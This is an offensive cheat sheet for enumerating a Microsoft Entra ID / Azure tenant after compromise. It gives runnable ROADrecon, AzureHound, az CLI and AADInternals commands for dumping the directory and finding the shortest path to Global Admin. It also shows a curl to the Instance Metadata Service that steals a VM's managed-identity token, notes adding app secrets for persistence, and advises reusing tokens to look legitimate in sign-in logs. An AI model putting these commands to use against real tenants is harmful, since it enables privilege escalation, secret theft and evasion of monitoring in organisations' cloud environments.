Azure / Entra ID Enumeration - Cheat Sheet

Once you hold valid creds or a token for a tenant, map it: users, groups,
roles, applications, service principals, devices, and (if you have an Azure
subscription) resources. Enumeration finds the path to Global Admin / Owner.
Tools: ROADrecon (ROADtools), AzureHound, az CLI, AADInternals.
This is the deep-dive companion to the entra-id-attacks cheatsheet.
Replace the placeholders (<...>) with your own values.


Two planes to enumerate (keep them straight)
  - Entra ID (Azure AD)  : directory - users/groups/roles/apps/SPs/devices.
  - Azure Resource Mgr   : subscriptions/resources - VMs, storage, Key Vaults,
                           managed identities. Needs RBAC on a subscription.


Step 1 - ROADrecon (best directory dump)

    roadrecon auth -u <user>@<domain> -p <password>
    # or with a refresh token / device-code (see entra-id-attacks):
    roadrecon auth --refresh-token <token>

    roadrecon gather          # pulls the whole directory into roadrecon.db
    roadrecon gui             # browse at http://127.0.0.1:5000

In the GUI, hunt: Global Administrators, role assignments, app owners,
applications with secrets/certs, dynamic groups, MFA status, stale guests.


Step 2 - AzureHound (attack paths, BloodHound-style)

    azurehound -u <user>@<domain> -p <password> list \
        --tenant <tenant-id> -o output.json

Import output.json into BloodHound CE and run Azure queries:
    - "Shortest paths to Global Admin"
    - control over app/service principals (AddSecret -> app-only token)
    - users who can reset privileged accounts' passwords


Step 3 - az CLI (interactive, Resource Manager plane)

    az login                                   # device-code or creds
    az account show                            # current tenant/subscription
    az ad user list -o table                   # directory users
    az ad sp list --all -o table               # service principals
    az role assignment list --all -o table     # who has what RBAC
    az vm list -o table ; az storage account list -o table
    az keyvault list -o table                  # then list secrets if you can

Look for Owner/Contributor at subscription/resource-group scope = pivot points.


Step 4 - AADInternals (Entra-specific tricks)

    Get-AADIntLoginInformation -Domain <domain>     # tenant brand/auth info
    Get-AADIntGlobalAdmins                          # list GAs (with token)
    # also useful for sync/PHS attacks - see entra-id-attacks


Step 5 - Managed Identity abuse (from inside a compromised Azure VM)

If you land on an Azure VM, hit the Instance Metadata Service (IMDS) for a
token tied to the VM's managed identity:

    curl -s -H "Metadata: true" \
      "http://169.254.169.254/metadata/identity/oauth2/token?api-version=2018-02-01&resource=https://management.azure.com/"

Use that token with az / REST to act as the identity (often Contributor on the
resource group). Also try resource=https://vault.azure.net for Key Vault.


What to flag (high-value findings)
  - Global Admin / Privileged Role Admin members, and who can become them.
  - App registrations with credentials you can add (AddSecret) -> persistence.
  - Managed identities with broad RBAC.
  - Key Vaults you can read (secrets/keys/certs).
  - Guests/dynamic-group rules that grant unexpected access.


Caveats
  - Sign-ins are logged (Conditional Access, risky sign-in). Reuse a single
    token where possible; device-code/refresh tokens look more legitimate.
  - Read-only enumeration is low-risk, but listing Key Vault secrets is audited.


Key idea: enumeration converts "a token" into "a plan." Entra ID and Azure RM
are two separate planes - directory vs resources - and you map each with the
right tool: ROADrecon for a full directory snapshot, AzureHound for attack
paths to Global Admin, az CLI for live resource/RBAC inspection, and IMDS for
managed-identity tokens from inside a VM. The goal is always the same: find the
shortest path to Global Admin or subscription Owner.
